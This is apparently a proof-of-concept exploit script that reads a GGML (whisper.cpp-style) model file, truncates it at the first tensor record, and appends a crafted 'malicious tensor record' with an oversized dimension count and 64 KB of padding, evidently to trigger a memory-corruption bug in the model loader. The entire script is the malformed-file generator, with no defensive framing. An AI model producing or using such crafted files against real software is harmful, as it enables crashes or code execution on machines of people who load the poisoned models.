import struct
import sys

src = sys.argv[1]
dst = sys.argv[2]
new_ndims = int(sys.argv[3], 0) if len(sys.argv) > 3 else 0x40000000

with open(src, 'rb') as f:
    b = bytearray(f.read())

pos = 0

def ru32():
    global pos
    v = struct.unpack_from('<I', b, pos)[0]
    pos += 4
    return v

def ri32():
    global pos
    v = struct.unpack_from('<i', b, pos)[0]
    pos += 4
    return v

magic = ru32()
assert magic == 0x67676d6c, f'bad magic {magic:#x}'

hparams = [ri32() for _ in range(11)]
n_vocab_h, n_audio_ctx, n_audio_state, n_audio_head, n_audio_layer, \
    n_text_ctx, n_text_state, n_text_head, n_text_layer, n_mels, ftype = hparams
print('hparams:', hparams)

n_mel = ri32()
n_fft = ri32()
pos += n_mel * n_fft * 4
print(f'mel filters n_mel={n_mel} n_fft={n_fft}')

n_vocab = ri32()
print(f'vocab n_vocab={n_vocab}')
for _ in range(n_vocab):
    ln = ru32()
    pos += ln

first_tensor_off = pos
print(f'first tensor record offset = {first_tensor_off} (file size = {len(b)})')

length = 4
ttype = 0
pad = b'\x41' * 65536
record = struct.pack('<iii', new_ndims, length, ttype) + pad

out = bytes(b[:first_tensor_off]) + record
with open(dst, 'wb') as f:
    f.write(out)
print(f'appended malicious tensor record: n_dims={new_ndims:#x} ({new_ndims}) length={length} ttype={ttype} pad={len(pad)}')
print(f'wrote {dst} ({len(out)} bytes)')
